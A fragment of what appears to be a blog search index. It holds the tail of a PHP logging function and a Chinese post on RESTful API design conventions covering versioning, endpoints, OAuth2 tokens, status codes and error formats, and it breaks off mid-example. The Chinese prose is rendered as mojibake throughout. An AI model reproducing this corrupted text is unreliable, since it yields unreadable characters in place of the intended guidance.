class="variable">$pathLog</span>);</span><br><span class="line">            copy(<span class="variable">$pathLog</span>,<span class="variable">$new_file</span>);</span><br><span class="line">            file_put_contents(<span class="variable">$pathLog</span>, <span class="string">&#x27;&lt;----&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&#x27;----&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$pathLog</span>, <span class="string">&#x27;&lt;----&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&#x27;----&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="string">&quot;\n&quot;</span>, FILE_APPEND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$pathLog</span>, <span class="string">&#x27;&lt;----&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>).<span class="string">&#x27;----&gt;&#x27;</span> . <span class="variable">$data</span> . <span class="string">&quot;\n&quot;</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RESETful API è®¾è®¡è§„èŒƒ</title>
      <link href="post/55580/"/>
      <url>post/55580/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ï¼Œä¸€ä¸ªå¥å£®çš„APIå¿…è¦æœ‰ä¼˜ç§€çš„è®¾è®¡è§„èŒƒï¼Œæœ¬æ–‡æ˜¯æœ€åŸºæœ¬çš„è®¾è®¡ç†å¿µ</p><span id="more"></span><h3 id="åè®®"><a href="#åè®®" class="headerlink" title="åè®®"></a>åè®®</h3><p>åœ¨é€šè¿‡ API äºåç«¯æœåŠ¡é€šä¿¡çš„è¿‡ç¨‹ä¸­ï¼Œåº”è¯¥ ä½¿ç”¨ HTTPS åè®®ã€‚</p><h3 id="API-Root-URL"><a href="#API-Root-URL" class="headerlink" title="API Root URL"></a>API Root URL</h3><p>API çš„æ ¹å…¥å£ç‚¹åº”å°½å¯èƒ½ä¿æŒè¶³å¤Ÿç®€å•ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªå¸¸è§çš„ URL æ ¹ä¾‹å­ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api.example.com/*</span><br><span class="line">example.com<span class="regexp">/api/</span>*</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä½ çš„åº”ç”¨å¾ˆåºå¤§æˆ–è€…ä½ é¢„è®¡å®ƒå°†ä¼šå˜çš„å¾ˆåºå¤§ï¼Œé‚£ åº”è¯¥ å°† API æ”¾åˆ°å­åŸŸä¸‹ã€‚è¿™ç§åšæ³•å¯ä»¥ä¿æŒæŸäº›è§„æ¨¡åŒ–ä¸Šçš„çµæ´»æ€§ã€‚</p></blockquote><h3 id="Versioning"><a href="#Versioning" class="headerlink" title="Versioning"></a>Versioning</h3><p>æ‰€æœ‰çš„ API å¿…é¡»ä¿æŒå‘åå…¼å®¹ï¼Œä½  å¿…é¡» åœ¨å¼•å…¥æ–°ç‰ˆæœ¬ API çš„åŒæ—¶ç¡®ä¿æ—§ç‰ˆæœ¬ API ä»ç„¶å¯ç”¨ã€‚æ‰€ä»¥ åº”è¯¥ ä¸ºå…¶æä¾›ç‰ˆæœ¬æ”¯æŒã€‚</p><p>ç›®å‰æ¯”è¾ƒå¸¸è§çš„ä¸¤ç§ç‰ˆæœ¬å·å½¢å¼ï¼š</p><p>åœ¨ URL ä¸­åµŒå…¥ç‰ˆæœ¬ç¼–å·</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api.example.com<span class="regexp">/v1/</span>*</span><br></pre></td></tr></table></figure><p>è¿™ç§åšæ³•æ˜¯ç‰ˆæœ¬å·ç›´è§‚ã€æ˜“äºè°ƒè¯•ï¼›å¦ä¸€ç§åšæ³•æ˜¯ï¼Œå°†ç‰ˆæœ¬å·æ”¾åœ¨ HTTP Header å¤´ä¸­ï¼š<br>é€šè¿‡åª’ä½“ç±»å‹æ¥æŒ‡å®šç‰ˆæœ¬ä¿¡æ¯</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: application/vnd<span class="selector-class">.example</span><span class="selector-class">.com</span>.v1+json</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ vnd è¡¨ç¤º Standards Tree æ ‡å‡†æ ‘ç±»å‹ï¼Œæœ‰ä¸‰ä¸ªä¸åŒçš„æ ‘: xï¼Œprs å’Œ vndã€‚ä½ ä½¿ç”¨çš„æ ‡å‡†æ ‘éœ€è¦å–å†³äºä½ å¼€å‘çš„é¡¹ç›®</p><ul><li>æœªæ³¨å†Œçš„æ ‘ï¼ˆxï¼‰ä¸»è¦è¡¨ç¤ºæœ¬åœ°å’Œç§æœ‰ç¯å¢ƒ</li><li>ç§æœ‰æ ‘ï¼ˆprsï¼‰ä¸»è¦è¡¨ç¤ºæ²¡æœ‰å•†ä¸šå‘å¸ƒçš„é¡¹ç›®</li><li>ä¾›åº”å•†æ ‘ï¼ˆvndï¼‰ä¸»è¦è¡¨ç¤ºå…¬å¼€å‘å¸ƒçš„é¡¹ç›®</li></ul><blockquote><p>åé¢å‡ ä¸ªå‚æ•°ä¾æ¬¡ä¸ºåº”ç”¨åç§°ï¼ˆä¸€èˆ¬ä¸ºåº”ç”¨åŸŸåï¼‰ã€ç‰ˆæœ¬å·ã€æœŸæœ›çš„è¿”å›æ ¼å¼ã€‚</p></blockquote><h3 id="Endpoints"><a href="#Endpoints" class="headerlink" title="Endpoints"></a>Endpoints</h3><p>ç«¯ç‚¹å°±æ˜¯æŒ‡å‘ç‰¹å®šèµ„æºæˆ–èµ„æºé›†åˆçš„ URLã€‚åœ¨ç«¯ç‚¹çš„è®¾è®¡ä¸­ï¼Œä½  å¿…é¡» éµå®ˆä¸‹åˆ—çº¦å®š:</p><ul><li>URL çš„å‘½å å¿…é¡» å…¨éƒ¨å°å†™</li><li>URL ä¸­èµ„æºï¼ˆresourceï¼‰çš„å‘½å å¿…é¡» æ˜¯åè¯ï¼Œå¹¶ä¸” å¿…é¡» æ˜¯å¤æ•°å½¢å¼</li><li>å¿…é¡» ä¼˜å…ˆä½¿ç”¨ Restful ç±»å‹çš„ URL</li><li>URL ä¸­ä¸èƒ½å‡ºç° -ï¼Œå¿…é¡» ç”¨ä¸‹åˆ’çº¿ _ ä»£æ›¿</li><li>URL å¿…é¡» æ˜¯æ˜“è¯»çš„</li><li>URL ä¸€å®šä¸å¯ æš´éœ²æœåŠ¡å™¨æ¶æ„</li></ul><h3 id="HTTP-åŠ¨è¯"><a href="#HTTP-åŠ¨è¯" class="headerlink" title="HTTP åŠ¨è¯"></a>HTTP åŠ¨è¯</h3><p>å¯¹äºèµ„æºçš„å…·ä½“æ“ä½œç±»å‹ï¼Œç”± HTTP åŠ¨è¯è¡¨ç¤ºã€‚å¸¸ç”¨çš„ HTTP åŠ¨è¯æœ‰ä¸‹é¢äº”ä¸ªï¼ˆæ‹¬å·é‡Œæ˜¯å¯¹åº”çš„ SQL å‘½ä»¤ï¼‰ã€‚</p><ul><li>GETï¼ˆSELECTï¼‰ï¼šä»æœåŠ¡å™¨å–å‡ºèµ„æºï¼ˆä¸€é¡¹æˆ–å¤šé¡¹ï¼‰ã€‚</li><li>POSTï¼ˆCREATEï¼‰ï¼šåœ¨æœåŠ¡å™¨æ–°å»ºä¸€ä¸ªèµ„æºã€‚</li><li>PUTï¼ˆUPDATEï¼‰ï¼šåœ¨æœåŠ¡å™¨æ›´æ–°èµ„æºï¼ˆå®¢æˆ·ç«¯æä¾›æ”¹å˜åçš„å®Œæ•´èµ„æºï¼‰ã€‚</li><li>PATCHï¼ˆUPDATEï¼‰ï¼šåœ¨æœåŠ¡å™¨æ›´æ–°èµ„æºï¼ˆå®¢æˆ·ç«¯æä¾›æ”¹å˜çš„å±æ€§ï¼‰ã€‚</li><li>DELETEï¼ˆDELETEï¼‰ï¼šä»æœåŠ¡å™¨åˆ é™¤èµ„æºã€‚</li></ul><h3 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h3><blockquote><p>å¦‚æœè®°å½•æ•°é‡å¾ˆå¤šï¼ŒæœåŠ¡å™¨ä¸å¯èƒ½éƒ½å°†å®ƒä»¬è¿”å›ç»™ç”¨æˆ·ã€‚API åº”è¯¥ æä¾›å‚æ•°ï¼Œè¿‡æ»¤è¿”å›ç»“æœã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„å‚æ•°ã€‚</p></blockquote><ul><li>?limit=10ï¼šæŒ‡å®šè¿”å›è®°å½•çš„æ•°é‡</li><li>?offset=10ï¼šæŒ‡å®šè¿”å›è®°å½•çš„å¼€å§‹ä½ç½®ã€‚</li><li>?page=2&amp;per_page=100ï¼šæŒ‡å®šç¬¬å‡ é¡µï¼Œä»¥åŠæ¯é¡µçš„è®°å½•æ•°ã€‚</li><li>?sortby=name&amp;order=ascï¼šæŒ‡å®šè¿”å›ç»“æœæŒ‰ç…§å“ªä¸ªå±æ€§æ’åºï¼Œä»¥åŠæ’åºé¡ºåºã€‚</li><li>?animal_type_id=1ï¼šæŒ‡å®šç­›é€‰æ¡ä»¶</li></ul><p>æ‰€æœ‰ URL å‚æ•° å¿…é¡» æ˜¯å…¨å°å†™ï¼Œå¿…é¡» ä½¿ç”¨ä¸‹åˆ’çº¿ç±»å‹çš„å‚æ•°å½¢å¼ã€‚</p><p>ç»å¸¸ä½¿ç”¨çš„ã€å¤æ‚çš„æŸ¥è¯¢ åº”è¯¥ æ ‡ç­¾åŒ–ï¼Œé™ä½ç»´æŠ¤æˆæœ¬ã€‚å¦‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /trades?<span class="attribute">status</span>=closed&amp;sort=sortby=name&amp;order=asc</span><br><span class="line"><span class="comment"># å¯ä¸ºå…¶å®šåˆ¶å¿«æ·æ–¹å¼</span></span><br><span class="line"><span class="builtin-name">GET</span> /trades/recently_closed</span><br></pre></td></tr></table></figure><h3 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h3><p>åº”è¯¥ ä½¿ç”¨ OAuth2.0 çš„æ–¹å¼ä¸º API è°ƒç”¨è€…æä¾›ç™»å½•è®¤è¯ã€‚å¿…é¡» å…ˆé€šè¿‡ç™»å½•æ¥å£è·å– Access Token åå†é€šè¿‡è¯¥ token è°ƒç”¨éœ€è¦èº«ä»½è®¤è¯çš„ APIã€‚</p><p>Oauth çš„ç«¯ç‚¹è®¾è®¡ç¤ºåˆ—</p><ul><li>RFC 6749   /token</li><li>Twitter    /oauth2/token</li><li>Fackbook   /oauth/access_token</li><li>Google     /o/oauth2/token</li><li>Github     /login/oauth/access_token</li><li>Instagram  /oauth/authorize</li></ul><p>å®¢æˆ·ç«¯åœ¨è·å¾— access token çš„åŒæ—¶ å¿…é¡» åœ¨å“åº”ä¸­åŒ…å«ä¸€ä¸ªåä¸º expires_in çš„æ•°æ®ï¼Œå®ƒè¡¨ç¤ºå½“å‰è·å¾—çš„ token ä¼šåœ¨å¤šå°‘ ç§’ åå¤±æ•ˆã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;access_token&quot;</span>: <span class="string">&quot;token....&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;token_type&quot;</span>: <span class="string">&quot;Bearer&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;expires_in&quot;</span>: <span class="number">3600</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯åœ¨è¯·æ±‚éœ€è¦è®¤è¯çš„ API æ—¶ï¼Œå¿…é¡» åœ¨è¯·æ±‚å¤´ Authorization ä¸­å¸¦ä¸Š access_tokenã€‚</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Authorization:</span> Bearer token...</span><br></pre></td></tr></table></figure><p>å½“è¶…è¿‡æŒ‡å®šçš„ç§’æ•°åï¼Œaccess token å°±ä¼šè¿‡æœŸï¼Œå†æ¬¡ç”¨è¿‡æœŸ/æˆ–æ— æ•ˆçš„ token è®¿é—®æ—¶ï¼ŒæœåŠ¡ç«¯ åº”è¯¥ è¿”å› invalid_token çš„é”™è¯¯æˆ– 401 é”™è¯¯ç ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-store</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;invalid_token&quot;</span></span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>Laravel å¼€å‘ä¸­ï¼Œåº”è¯¥ ä½¿ç”¨ JWT æ¥ä¸ºç®¡ç†ä½ çš„ Tokenï¼Œå¹¶ä¸” ä¸€å®šä¸å¯ åœ¨ api ä¸­é—´ä»¶ä¸­å¼€å¯è¯·æ±‚ sessionã€‚</p></blockquote><h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>æ‰€æœ‰çš„ API å“åº”ï¼Œå¿…é¡» éµå®ˆ HTTP è®¾è®¡è§„èŒƒï¼Œå¿…é¡» é€‰æ‹©åˆé€‚çš„ HTTP çŠ¶æ€ç ã€‚ä¸€å®šä¸å¯ æ‰€æœ‰æ¥å£éƒ½è¿”å›çŠ¶æ€ç ä¸º 200 çš„ HTTP å“åº”ï¼Œå¦‚:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> ok</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>example.com</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;code&quot;</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;data&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;username&quot;</span>: <span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="json">    &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>å¸¸è§çš„ HTTP çŠ¶æ€ç </p><table><thead><tr><th>çŠ¶æ€ç </th><th>æè¿°</th></tr></thead><tbody><tr><td>1xx</td><td>ä»£è¡¨è¯·æ±‚å·²è¢«æ¥å—ï¼Œéœ€è¦ç»§ç»­å¤„ç†</td></tr><tr><td>2xx</td><td>è¯·æ±‚å·²æˆåŠŸï¼Œè¯·æ±‚æ‰€å¸Œæœ›çš„å“åº”å¤´æˆ–æ•°æ®ä½“å°†éšæ­¤å“åº”è¿”å›</td></tr><tr><td>3xx</td><td>é‡å®šå‘</td></tr><tr><td>4xx</td><td>å®¢æˆ·ç«¯å¼•èµ·çš„é”™è¯¯</td></tr><tr><td>5xx</td><td>æœåŠ¡ç«¯å¼•èµ·çš„é”™è¯¯</td></tr></tbody></table><blockquote><p>åªæœ‰æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚è¢«æ­£ç¡®çš„å¤„ç†åæ‰èƒ½è¿”å› 2xx çš„å“åº”ï¼Œæ‰€ä»¥å½“ API è¿”å› 2xx ç±»å‹çš„çŠ¶æ€ç æ—¶ï¼Œå‰ç«¯ å¿…é¡» è®¤å®šè¯¥è¯·æ±‚å·²å¤„ç†æˆåŠŸã€‚</p></blockquote><p>å¿…é¡»å¼ºè°ƒçš„æ˜¯ï¼Œæ‰€æœ‰ API ä¸€å®šä¸å¯ è¿”å› 1xx ç±»å‹çš„çŠ¶æ€ç ã€‚å½“ API å‘ç”Ÿé”™è¯¯æ—¶ï¼Œå¿…é¡» è¿”å›å‡ºé”™æ—¶çš„è¯¦ç»†ä¿¡æ¯ã€‚ç›®å‰å¸¸è§è¿”å›é”™è¯¯ä¿¡æ¯çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼š</p><p>1ã€å°†é”™è¯¯è¯¦ç»†æ”¾å…¥ HTTP å“åº”é¦–éƒ¨ï¼›</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">X</span>-MYNAME-<span class="meta">ERROR</span>-CODE: 4001</span><br><span class="line"><span class="meta">X</span>-MYNAME-<span class="meta">ERROR</span>-<span class="meta">MESSAGE</span>: Bad authentication token</span><br><span class="line"><span class="meta">X</span>-MYNAME-<span class="meta">ERROR</span>-INFO: http://docs.example.com/api/v1/authentication</span><br></pre></td></tr></table></figure><p>2ã€ç›´æ¥æ”¾å…¥å“åº”å®ä½“ä¸­ï¼›</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 10:02:59 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">40100</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;Unauthorized&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>è€ƒè™‘åˆ°æ˜“è¯»æ€§å’Œå®¢æˆ·ç«¯çš„æ˜“å¤„ç†æ€§ï¼Œæˆ‘ä»¬ å¿…é¡» æŠŠé”™è¯¯ä¿¡æ¯ç›´æ¥æ”¾åˆ°å“åº”å®ä½“ä¸­ï¼Œå¹¶ä¸”é”™è¯¯æ ¼å¼ åº”è¯¥ æ»¡è¶³å¦‚ä¸‹æ ¼å¼ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;æ‚¨æŸ¥æ‰¾çš„èµ„æºä¸å­˜åœ¨&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error_code&quot;</span>: <span class="number">404001</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­é”™è¯¯ç ï¼ˆerror_codeï¼‰å¿…é¡» å’Œ HTTP çŠ¶æ€ç å¯¹åº”ï¼Œä¹Ÿæ–¹ä¾¿é”™è¯¯ç å½’ç±»ï¼Œå¦‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">429</span> Too Many Requests</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 10:15:52 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;error_code&quot;</span>:<span class="number">429001</span>,<span class="attr">&quot;message&quot;</span>:<span class="string">&quot;ä½ æ“ä½œå¤ªé¢‘ç¹äº†&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>åº”è¯¥ åœ¨è¿”å›çš„é”™è¯¯ä¿¡æ¯ä¸­ï¼ŒåŒæ—¶åŒ…å«é¢å‘å¼€å‘è€…å’Œé¢å‘ç”¨æˆ·çš„æç¤ºä¿¡æ¯ï¼Œå‰è€…å¯æ–¹ä¾¿å¼€å‘äººå‘˜è°ƒè¯•ï¼Œåè€…å¯ç›´æ¥å±•ç¤ºç»™ç»ˆç«¯ç”¨æˆ·æŸ¥çœ‹å¦‚ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;message&quot;</span>: <span class="string">&quot;ç›´æ¥å±•ç¤ºç»™ç»ˆç«¯ç”¨æˆ·çš„é”™è¯¯ä¿¡æ¯&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error_code&quot;</span>: <span class="string">&quot;ä¸šåŠ¡é”™è¯¯ç &quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;ä¾›å¼€å‘è€…æŸ¥çœ‹çš„é”™è¯¯ä¿¡æ¯&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;debug&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;é”™è¯¯å †æ ˆï¼Œå¿…é¡»å¼€å¯ debug æ‰å­˜åœ¨&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢è¯¦ç»†åˆ—ä¸¾äº†å„ç§æƒ…å†µ API çš„è¿”å›è¯´æ˜ã€‚</p><h3 id="200-ok"><a href="#200-ok" class="headerlink" title="200 ok"></a>200 ok</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">200 çŠ¶æ€ç æ˜¯æœ€å¸¸è§çš„ HTTP çŠ¶æ€ç ï¼Œåœ¨æ‰€æœ‰ æˆåŠŸ çš„ <span class="builtin-name">GET</span> è¯·æ±‚ä¸­ï¼Œå¿…é¡» è¿”å›æ­¤çŠ¶æ€ç ã€‚HTTP å“åº”å®ä½“éƒ¨åˆ† å¿…é¡» ç›´æ¥å°±æ˜¯æ•°æ®ï¼Œä¸è¦åšå¤šä½™çš„åŒ…è£…ã€‚</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">            <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://lorempixel.com/640/480/?32556&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;fwest&quot;</span>,</span><br><span class="line">            <span class="string">&quot;last_logined_time&quot;</span>: <span class="string">&quot;2018-05-29 04:56:43&quot;</span>,</span><br><span class="line">            <span class="string">&quot;has_registed&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: 2,</span><br><span class="line">            <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://lorempixel.com/640/480/?86144&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;zschowalter&quot;</span>,</span><br><span class="line">            <span class="string">&quot;last_logined_time&quot;</span>: <span class="string">&quot;2018-06-16 15:18:34&quot;</span>,</span><br><span class="line">            <span class="string">&quot;has_registed&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;pagination&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;total&quot;</span>: 101,</span><br><span class="line">            <span class="string">&quot;count&quot;</span>: 2,</span><br><span class="line">            <span class="string">&quot;per_page&quot;</span>: 2,</span><br><span class="line">            <span class="string">&quot;current_page&quot;</span>: 1,</span><br><span class="line">            <span class="string">&quot;total_pages&quot;</span>: 51,</span><br><span class="line">            <span class="string">&quot;links&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;next&quot;</span>: <span class="string">&quot;http://api.example.com?page=2&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­ï¼Œåˆ†é¡µå’Œå…¶ä»–é¢å¤–çš„åª’ä½“ä¿¡æ¯ï¼Œå¿…é¡»æ”¾åˆ° meta å­—æ®µä¸­ã€‚</p></blockquote><h3 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h3><p>å½“æœåŠ¡å™¨åˆ›å»ºæ•°æ®æˆåŠŸæ—¶ï¼Œåº”è¯¥ è¿”å›æ­¤çŠ¶æ€ç ã€‚å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ä½¿ç”¨ POST æäº¤ç”¨æˆ·ä¿¡æ¯ï¼Œå¦‚ï¼š</p><ul><li>æ·»åŠ äº†æ–°ç”¨æˆ·</li><li>ä¸Šä¼ äº†å›¾ç‰‡</li><li>åˆ›å»ºäº†æ–°æ´»åŠ¨</li></ul><p>ç­‰ï¼Œéƒ½å¯ä»¥è¿”å› 201 çŠ¶æ€ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½ å¯ä»¥é€‰æ‹©åœ¨ç”¨æˆ·åˆ›å»ºæˆåŠŸåè¿”å›æ–°ç”¨æˆ·çš„æ•°æ®</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">201</span> Created</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.11.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 24 Jun 2018 09:13:40 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span 